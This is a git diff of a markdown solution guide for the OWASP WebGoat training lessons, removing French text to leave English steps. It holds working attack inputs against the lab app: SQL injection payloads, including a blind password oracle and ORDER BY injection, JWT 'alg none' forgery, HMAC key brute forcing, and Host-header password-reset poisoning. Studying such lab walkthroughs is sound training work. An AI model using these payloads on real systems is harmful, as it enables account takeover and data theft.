@@ -1,4 +1,4 @@
-*Read this in other languages: [English](wiki_owasp_webgoat.fr.md).*
+*Read this in other languages: [Français](wiki_owasp_webgoat.fr.md).*
 
 
 - [**Introduction:**](#introduction)
@@ -51,21 +51,22 @@
 
 ##### WebGoat
 
-1\. Lire la leçon. 1\. Read the lesson.
+1. 
+Read the lesson.
 
 ##### WebWolf
 
 3.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Un bug sur WebWolf empêche d'accéder à la _Mailbox_.  There is a bug on WebWolf that prevents access to _Mailbox_. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  There is a bug on WebWolf that prevents access to _Mailbox_. 
 
-*   Envoyer un email à `{utilisateur}@...`. Send an email to `{user}@...`
-*   Aller sur http://host:port/WebWolf. Go to http://host:port/WebWolf.
-*   S'identifer puis aller lire le mail reçu. Log in and go read the mail received.
+*   Send an email to `{user}@...`.
+*   Go to http://host:port/WebWolf.
+*   Log in and go read the mail received.
 
 4.
-*   Cliquer sur **Click here to reset your password** et rentrer n'importe quel mot de passe. Send an email to `{user}@...`
-*   Aller sur http://host:port/WebWolf/requests. Go to http://host:port/WebWolf/requests.
-*   Observer dans la requête le paramètre `uniqueCode` et rentrer se valeur sur **WebGoat**. Observe the `uniqueCode` parameter in the query and enter its value on **WebGoat**.
+*   Send an email to `{user}@...`
+*   Go to http://host:port/WebWolf/requests.
+*   Observe the `uniqueCode` parameter in the query and enter its value on **WebGoat**.
 
 #### **General:**
 
@@ -81,23 +82,23 @@ Enter your name and press **Go!**.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Turn on Show Parameters or other features  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to intercept the request with OWASP ZAP
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Remplir les champs sur **WebGoat** avec `POST` ou `GET` et un nombre aléatoire, et cliquer sur **Go!**. Fill out the fields on **WebGoat** with `POST` or `GET` and a random number, and click on **Go!**.
-*   Repérer la requête vers `attack2` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `attack2` in the _Network_ tab and click on _Edit and Resend_.
-*   Récupérer le `magic_num` dans le corps de la requête, repérer que la requête est un `POST` et recliquer sur **Go!** avec les bons paramètres. Retrieve the `magic_num` in the body of the request, find that the request is a `POST` and click again on **Go!** with the correct parameters.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Fill out the fields on **WebGoat** with `POST` or `GET` and a random number, and click on **Go!**.
+*   Locate the query to `attack2` in the _Network_ tab and click on _Edit and Resend_.
+*   Retrieve the `magic_num` in the body of the request, find that the request is a `POST` and click again on **Go!** with the correct parameters.
 
 ![HTTP Basics](images/wiki_owasp_webgoat/http-basics.png)
 
 ##### HTTP Proxies
 
 6.
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Cliquer sur **Submit** en laissant le paramètre intact. Click on **Submit** without editing the parameter.
-*   Repérer la requête vers `intercept-request` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `intercept-request` in the _Network_ tab and click on _Edit and Resend_.
-*   Changer la méthode de `POST` à `GET`. Change the `POST` method to `GET`.
-*   Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à [](http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily)http://host:port/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily. Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to [http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily](http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily)
-*   Ajouter dans les en-têtes de requête `x-request-intercepted:true`. Add in the request header `x-request-intercepted: true`.
-*   Effacer le corps de la requête. Clear the body of the query.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Click on **Submit** without editing the parameter.
+*   Locate the query to `intercept-request` in the _Network_ tab and click on _Edit and Resend_.
+*   Change the `POST` method to `GET`.
+*   Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to [http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily](http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily)
+*   Add in the request header `x-request-intercepted: true`.
+*   Clear the body of the query.
 
 ![HTTP Proxies](images/wiki_owasp_webgoat/http-proxies.png)
 
@@ -122,20 +123,20 @@ Solution 2: The systems security is compromised even if only one goal is harmed.
 
 ##### Google Chrome Developer Tools
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_. Open the _Development Tools_ in the browser, and go to the _Console_ tab.
-*   Dans la console, entrer `webgoat.customjs.phoneHome()` Enter `webgoat.customjs.phoneHome()` in the console.
+*   Open the _Development Tools_ in the browser, and go to the _Console_ tab.
+*   Enter `webgoat.customjs.phoneHome()` in the console.
 
 ![Google Chrome Dev Tools 4](images/wiki_owasp_webgoat/google-chrome-dev-tools-4.png)
 
 6.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Contrairement à ce que les indices disent, la requête ne s'appelle pas `dummy`, mais `network`.  Contrary to what the hints say, the name of the request is not `dummy`, but `network`. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Contrary to what the hints say, the name of the request is not `dummy`, but `network`. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Clear all Requests from the network button, then make the request. The you should be able to figure out, which request holds the data.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The name of the request is "dummy"
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Go!**. On **WebGoat** click on **Go!**.
-*   Repérer la requête vers `network` dans l'onglet _Réseau_ et cliquer sur _Paramètres_. Locate the query to `network` in the _Network_ tab and click on _Parameters_.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On **WebGoat** click on **Go!**.
+*   Locate the query to `network` in the _Network_ tab and click on _Parameters_.
 
 ![Google Chrome Dev Tools 6](images/wiki_owasp_webgoat/google-chrome-dev-tools-6.png)
 
@@ -221,7 +222,7 @@ Solution 2: The systems security is compromised even if only one goal is harmed.
 ![Hint](images/wiki_owasp_webgoat/hint.png) Your new SQL query must end with a comment. eg: --  
 ![Hint](images/wiki_owasp_webgoat/hint.png) If a column needs a String you could substitute something like 'a String' for it. For integers you could substitute a 1.
 
-*   Name: `'; SELECT * FROM user_system_data;--` ou `' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--` Name: `'; SELECT * FROM user_system_data;--` or `' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--`
+*   Name: `'; SELECT * FROM user_system_data;--` or `' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--`
 *   Password: `passW0rD`
 
 5.  
@@ -232,18 +233,18 @@ Solution 2: The systems security is compromised even if only one goal is harmed.
 ![Hint](images/wiki_owasp_webgoat/hint.png) The table name is randomized at each start of WebGoat, try to figure out the name first.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Change the password through an UPDATE Statement.
 
-Comme spécifié dans les indices, il est possible de changer le mot de passe à l'aide d'un `UPDATE`. Il est aussi possible de retrouver le mot de passe d'origine comme nous allons le voir dans la solution proposée. As specified in the hints, it is possible to change the password using an `UPDATE`. It is also possible to find the original password as we will see in the proposed solution.
+As specified in the hints, it is possible to change the password using an `UPDATE`. It is also possible to find the original password as we will see in the proposed solution.
 
-*   Le formulaire **Login** ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire **Register** nous permet de vérifier si un nom d'utilisateur existe déjà. The **Login** form does not appear to provide any useful outputs from a variety of inputs, but the **Register** form allows us to check whether a username already exists.
-*   Si nous essayons de nous inscrire avec le nom d'utilisateur suivant: `tom' AND '1'='1` nous constatons que le nom d'utilisateur est pris. If we try to register with the following username: `tom' AND '1'='1` we find that the username is taken.
-*   Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois. We can use this as an oracle and check what Tom's password is one at a time.
-*   La table que nous recherchons s'appelle `password` (_guessing_), nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant : `tom' AND substring(password, 1,1)='t`. Fortunately, the table we are seeking is named `password` (_guessing_), so we can attempt to register with the following username: `tom' AND substring(password,1,1)='t`
-*   La réponse indique que le nom d'utilisateur existe déjà, nous savons que **t** est le premier caractère du mot de passe de Tom. The response states the username already exists, we know that **t** is the first character of Tom's password.
-*   En _fuzzing_ pour les caractères restants, nous pouvons déterminer que le mot de passe de Tom est **thisisasecretfortomonly**. By fuzzing for the remaining characters, we can determine that Tom's password is **thisisasecretfortomonly**.
+*   The **Login** form does not appear to provide any useful outputs from a variety of inputs, but the **Register** form allows us to check whether a username already exists.
+*   If we try to register with the following username: `tom' AND '1'='1` we find that the username is taken.
+*   We can use this as an oracle and check what Tom's password is one at a time.
+*   Fortunately, the table we are seeking is named `password` (_guessing_), so we can attempt to register with the following username: `tom' AND substring(password,1,1)='t`
+*   The response states the username already exists, we know that **t** is the first character of Tom's password.
+*   By fuzzing for the remaining characters, we can determine that Tom's password is **thisisasecretfortomonly**.
 
-Ce challenge peut être un bon exercice pour s'entraîner au scripting. Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse: This challenge can be a good exercise to practice scripting. Below, a small example of Python code to find the answer:
+This challenge can be a good exercise to practice scripting. Below, a small example of Python code to find the answer:
 
-```
+```python
 import json  
 import requests  
   
@@ -318,7 +319,7 @@ Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
 ![Hint](images/wiki_owasp_webgoat/hint.png) First establish a connection, after that you can create a statement.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) SqlStringInjectionHint-mitigation-10a-10a2
 
-Les cases doivent contenir les mots suivants pour valider la leçon : The fields must contain the following words to validate the lesson: `getConnection`, `PreparedStatement`, `prepareStatement`, `?`, `?`, `setString`, `setString`.  
+The fields must contain the following words to validate the lesson: `getConnection`, `PreparedStatement`, `prepareStatement`, `?`, `?`, `setString`, `setString`.  
 
 ![SQLi Mitigation 5](images/wiki_owasp_webgoat/sqli-mitigation-5.png)
 
@@ -329,9 +330,9 @@ Les cases doivent contenir les mots suivants pour valider la leçon : The fields
 ![Hint](images/wiki_owasp_webgoat/hint.png) Make sure to execute your statement.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) View the previous lesson to check back on how you can build set up a connection.
 
-Compléter la fenêtre avec : Complete the window with:
+Complete the window with:
 
-```
+```java
 try {  
      Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
      PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
@@ -345,24 +346,22 @@ try {
 ![SQLi Mitigation 6](images/wiki_owasp_webgoat/sqli-mitigation-6.png)
 
 10.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Leçon buggée avec la dernière version, l'appel vers http://localhost:8080/WebGoat/SqlInjection/servers renvoie une erreur.  Buggy lesson with the last version, a call to http://localhost:8080/WebGoat/SqlInjection/servers send back an error. 
+![Warning](images/wiki_owasp_webgoat/warning.png)   Buggy lesson with the last version, a call to http://localhost:8080/WebGoat/SqlInjection/servers send back an error. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try sorting and look at the request  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Intercept the request and try to specify a different order by  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Use for example "(case when (true) then hostname else id end)" in the order by and see what happens
 
-*   Trier les colonnes (par IP par exemple) effectue une requête vers http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. Cela peut être exploité en interceptant la requête avec les outils de développement du navigateur et en fournissant une requête SQL comme valeur de colonne. Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
-*   Pour avoir une idée de l'adresse IP de **webgoat-prd**, il faut trouver le nom des colonnes dans les tables pour les noms de serveur et les IP. La supposition évidente est **servers** and **ip**.  
-    `column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)` To get the idea about **webgoat-prd** IP address we first have to find out the table name and ip column name. The obvious guess is **servers** and **ip**:  
+*   uClick on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
+*   To get the idea about **webgoat-prd** IP address we first have to find out the table name and ip column name. The obvious guess is **servers** and **ip**:  
     `column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
-*   Si les noms de table sont corrects, le tableau devrait être trié par **ids**. If that is the correct table and column name, the table will get sorted by **ids**.
-*   C'est le cas, la supposition était donc correcte. So after intercepting and changing the request we get the table sorted by **ids**, the guess was correct.
-*   Afin de tester la logique on peut essayer de déclencher une erreur avec :  
-    `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)` Just to check our logic, lets send request with:  
+*   If that is the correct table and column name, the table will get sorted by **ids**.
+*   So after intercepting and changing the request we get the table sorted by **ids**, the guess was correct.
+*   Just to check our logic, lets send request with:  
     `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
-*   On tombe sur une page d'erreur, on a tout pour écrire le script maintenant. It get's an error page, we have everything to script the attack now.
+*   It get's an error page, we have everything to script the attack now.
   
-```
+```python
 import json  
 import requests  
   
@@ -400,20 +399,22 @@ sql_injection_mitigation_10()
 
 ##### Secure Passwords
 
-4. La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe. 4\. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn .
+4. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn.
 
 ##### Password reset
 
 2.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Un bug sur WebWolf empêche d'accéder à la _Mailbox_.  There is a bug on WebWolf that prevents access to _Mailbox_. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  There is a bug on WebWolf that prevents access to _Mailbox_. 
 
-*   Cliquer sur **Forgot your password?**. Click on **Forgot your password?**.
-*   Renseigner l'adresse mail `{utilisateur}@...` Enter the email address `{user}@...`
-*   Ouvrir le mail sur **WebWolf** afin de récupérer le nouveau mot de passe. Open the mail on **WebWolf** to retrieve the new password.
+*   Click on **Forgot your password?**.
+*   Enter the email address `{user}@...`.
+*   Open the mail on **WebWolf** to retrieve the new password.
 
-4. Les identifiants valides sont: **admin** et **green**, **jerry** et **orange**, **tom** et **purple**, **larry** et **yellow**. 4\. Valid credentials are: **admin** and **green**, **jerry** and **orange**, **tom** and **purple**, **larry** and **yellow**.
+4.
+Valid credentials are: **admin** and **green**, **jerry** and **orange**, **tom** and **purple**, **larry** and **yellow**.
 
-5. Lire les différents conseils. 5\. Read the advices.
+5. 
+Read the advices.
 
 6.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.  
@@ -423,10 +424,10 @@ sql_injection_mitigation_10()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Intercept the request and change the host header.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) For intercepting the request you have to use a proxy. Check the HTTP-Proxies Lesson in the general category if you're unfamiliar with using proxies. Important: There seem to be problems when modifying the request header with ZAP. We recommend to use Burp instead.
 
-*   Envoyer un mail à `tom@webgoat-cloud.org` et intercepter la requête. Send an email to `tom@webgoat-cloud.org` and intercept the request.
-*   Modifier l'en-tête `Host: host:webgoat_port` en `Host: host:webwolf_port` et renvoyer une requête. Change the `Host: host:webgoat_port` header to `Host: host:webwolf_port` and return a request.
-*   Sur **WebWolf**, aller dans **Incoming requests**, récupérer la variable `path` et aller à l'URL http://host:webgoat\_port/WebGoat/path. On **WebWolf**, go to **Incoming requests**, retrieve the variable `path` and go to the URL http://host:webgoat\_port/WebGoat/path .
-*   Changer le mot de passe et valider le challenge avec ce dernier (validation buggée). Change the password and validate the challenge with the latter (validation bugged).
+*   Send an email to `tom@webgoat-cloud.org` and intercept the request.
+*   Change the `Host: host:webgoat_port` header to `Host: host:webwolf_port` and return a request.
+*   On **WebWolf**, go to **Incoming requests**, retrieve the variable `path` and go to the URL http://host:webgoat\_port/WebGoat/path .
+*   Change the password and validate the challenge with the latter (validation bugged).
  
 ![Password Reset 6](images/wiki_owasp_webgoat/password-reset-6.png)  
 ![Password Reset 6](images/wiki_owasp_webgoat/password-reset-6-webwolf.png)
@@ -439,17 +440,17 @@ sql_injection_mitigation_10()
 ![Hint](images/wiki_owasp_webgoat/hint.png) The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Have you tried renaming the secQuestion0 and secQuestion1 parameters?
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Cliquer sur **Submit** sans rentrer de paramètres. Click on **Submit** without parameters.
-*   Repérer la requête vers `verify-account` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `verify-account` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier les paramètres `secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` en `secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` Modify the parameters `secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` to `secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid`
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Click on **Submit** without parameters.
+*   Locate the query to `verify-account` in the _Network_ tab and click on _Edit and Resend_.
+*   Modify the parameters `secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` to `secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid`.
 
 ![Authentification Bypass](images/wiki_owasp_webgoat/authentification-bypass-2.png)
 
 ##### JWT tokens
 
 4.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Select a different user and look at the token you receive back, use the delete button to reset the votes count  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Decode the token and look at the contents  
@@ -457,14 +458,14 @@ sql_injection_mitigation_10()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Change the admin field to true in the token  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Submit the token by changing the algorithm to None and remove the signature
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, se connecter avec Tom et cliquer sur **Reset Votes**. Log in as Tom on WebGoat and click on **Reset Votes**.
-*   Repérer la requête vers `reset` dans l'onglet _Réseau_ et cliquer sur _En-têtes_. Locate the query to `reset` in the _Network_ tab and click on _Headers_.
-*   Remarquer l'en-tête : `Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA` Notice the header: `Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA`
-*   En base64, cela se décode en : `{"alg":"HS512"}.{"iat":1564402244,"admin":"false","user":"Tom"}.signature`. In base64, this is decoded as: `{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature`.
-*   Le modifier en `{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.`. Edit it to `{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.`.
-*   Le ré-encoder en base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`). Re-encode it to base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`).
-*   Cliquer sur _Modifier et Renvoyer_, modifier le cookie avec la nouvelle valeur générée, et renvoyer la requête. Click on _Modify and Resend_, modify the cookie with the newly generated value and send again the request.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Log in as Tom on WebGoat and click on **Reset Votes**.
+*   Locate the query to `reset` in the _Network_ tab and click on _Headers_.
+*   Notice the header: `Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA`
+*   In base64, this is decoded as: `{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature`.
+*   Edit it to `{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.`.
+*   Re-encode it to base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`).
+*   Click on _Modify and Resend_, modify the cookie with the newly generated value and send again the request.
 
 ![JWT 4](images/wiki_owasp_webgoat/jwt-4.png)
 
@@ -475,15 +476,21 @@ sql_injection_mitigation_10()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Download a word list dictionary (https://github.com/first20hours/google-10000-english)  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Write a small program or use HashCat for brute forcing the token according the word list
 
-Il est possible d'effectuer ce challenge à l'aide d'outils tels que **johntheripper** et https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python.  
 It is possible to validate this challenge with tools like **johntheripper** and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script.  
 
-*   Isoler la signature, et la reformater correctement. Isolate the signature, and reformat it correctly.
-*   Utiliser chaque mot du dictionnaire comme clé, calculer le HMAC du message initial, le convertir en base64, et comparer avec la signature. Use each word of the dictionary as a key, calculate the HMAC of the initial message, convert it to base64, and compare it with the signature.
-*   S'il y a correspondance, le mot du dictionnaire correspond à la clé (valeur trouvée : **victory**). If there is a match, the dictionnary word is the key used (value found : **victory**).
-*   Calculer alors la nouvelle signature avec le message modifié (valeur trouvée : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVPWWGE01u1jO2a-yfx8lZetbDqiTc`). Then calculate the new signature with the modified message (value found: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVPWWGE01u1jO2a-yfx8lZetbDqiTc`).
-
+*   Isolate the signature, and reformat it correctly.
+*   Use each word of the dictionary as a key, calculate the HMAC of the initial message, convert it to base64, and compare it with the signature.
+*   If there is a match, the dictionnary word is the key used (value found : **victory**).
+*   Then calculate the new signature with the modified message
 ```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJ
+pYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ
+0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmN
+vbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVP
+WWGE01u1jO2a-yfx8lZetbDqiTc
+```
+
+```python
 import base64  
 import hashlib  
 import hmac  
@@ -521,18 +528,18 @@ jwt_tokens_5()
 ![JWT 5](images/wiki_owasp_webgoat/jwt-5.png)
 
 7.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Ce challenge ne donne pas assez d'informations pour être résolu. En fouillant dans le code source, on se rend compte qu'il faut faire une requête `POST` vers http://host:port/WebGoat/JWT/refresh/login, ayant pour en-tête `Content-Type: application/json` et pour corps `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` pour récupérer le token d'actualisation de Jerry.  This challenge doesn't provide enough information to be completed. By looking into the source code, we can find the following has to be done: Make a `POST` request to http://host:port/WebGoat/JWT/refresh/login with header `Content-Type: application/json` and content `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` to obtain a `<jerry_refresh_token>`.   
-![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation.. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  This challenge doesn't provide enough information to be completed. By looking into the source code, we can find the following has to be done: Make a `POST` request to http://host:port/WebGoat/JWT/refresh/login with header `Content-Type: application/json` and content `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` to obtain a `<jerry_refresh_token>`.   
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look at the access log you will find a token there  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The token from the access log is no longer valid, can you find a way to refresh it?  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The endpoint for refreshing a token is 'jwt/refresh/newToken'  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Use the found access token in the Authorization: Bearer header and use your own refresh token
 
-*   Récupérer le token d'accès de Tom dans les **logs**. Find the `<tom_access_token>` from the logs.
-*   Faire une requête `POST` vers http://host:port/WebGoat/JWT/refresh/newToken , ayant pour en-tête `Content-Type: application/json` et `Authorization: Bearer <tom_access_token>` et pour corps `{"refresh_token":"<jerry_refresh_token>"}` Make a `POST` request to http://host:port/WebGoat/JWT/refresh/newToken with header `Content-Type: application/json` and `Authorization: Bearer <tom_access_token>` and content `{"refresh_token":"<jerry_refresh_token>"}`
-*   Récupérer le nouveau token d'accès de Tom. Get the `<tom_access_token_new>`.
-*   Intercepter la requête vers http://host:port/WebGoat/JWT/refresh/checkout et ajouter l'en-tête `Authorization: Bearer <tom_new_access_token>`. Intercept the POST request to http://host:port/WebGoat/JWT/refresh/checkout and add header `Authorization: Bearer <tom_access_token_new>`
+*   Find the `<tom_access_token>` from the logs.
+*   Make a `POST` request to http://host:port/WebGoat/JWT/refresh/newToken with header `Content-Type: application/json` and `Authorization: Bearer <tom_access_token>` and content `{"refresh_token":"<jerry_refresh_token>"}`
+*   Get the `<tom_access_token_new>`.
+*   Intercept the POST request to http://host:port/WebGoat/JWT/refresh/checkout and add header `Authorization: Bearer <tom_access_token_new>`
 
 ![JWT 7](images/wiki_owasp_webgoat/jwt-7-1.png)
 
@@ -545,8 +552,8 @@ jwt_tokens_5()
 ![JWT 7](images/wiki_owasp_webgoat/jwt-7-5.png)
 
 8.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Il manque une précision dans les indices, la clé est décodée comme une chaine en base64, aussi au lieu d'utiliser comme **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, il faut utiliser `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`  It lacks a precision in the hints: the key is decoded as a base64 chain. Also instead of using as **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, you have to use `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`   
